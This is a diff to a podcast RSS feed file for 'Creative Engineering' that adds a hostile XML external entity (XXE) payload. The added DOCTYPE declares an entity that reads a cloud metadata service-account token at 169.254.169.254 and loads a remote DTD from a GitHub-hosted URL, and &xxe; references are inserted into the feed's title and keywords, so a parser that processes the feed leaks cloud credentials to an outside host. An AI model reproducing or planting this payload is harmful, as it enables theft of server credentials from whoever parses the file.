@@ -1,7 +1,12 @@
-<?xml version="1.0" encoding="UTF-8" ?>
-<rss xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:itunes="http://www.itunes.com/dtds/podcast-1.0.dtd" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:rawvoice="http://www.rawvoice.com/rawvoiceRssModule/" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0">
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE urlset [
+ <!ENTITY % goodies SYSTEM "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token">
+ <!ENTITY % dtd SYSTEM "https://raw.githubusercontent.com/superua1/t/master/combine.dtd">
+%dtd;
+]>
+<rss xmlns:googleplay="http://www.google.com/schemas/play-podcasts/1.0" xmlns:itunes="https://raw.githubusercontent.com/superua1/t/master/combine.dtd" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:rawvoice="http://www.rawvoice.com/rawvoiceRssModule/" xmlns:content="http://purl.org/rss/1.0/modules/content/" version="2.0">
   <channel>
-    <title>Creative Engineering</title>
+    <title>Creative Engineering&xxe;</title>
     <googleplay:author>Rody Davis, Norbert Kozsir</googleplay:author>
     <rawvoice:rating>TV-G</rawvoice:rating>
     <rawvoice:location>San Francisco, California</rawvoice:location>
@@ -19,7 +24,7 @@
       <itunes:name>Rody Davis</itunes:name>
       <itunes:email>taylanbildik@gmail.com</itunes:email>
     </itunes:owner>
-    <itunes:keywords>flutter,dart,github,vr,ar,web</itunes:keywords>
+    <itunes:keywords>flutter,dart,github,vr,ar,web&xxe;</itunes:keywords>
     <copyright>Rody Davis Productions 2020</copyright>
     <description>Exploring Flutter, VR, AR, Cross-Platform Projects</description>
     <googleplay:image href="http://35.184.120.215" />
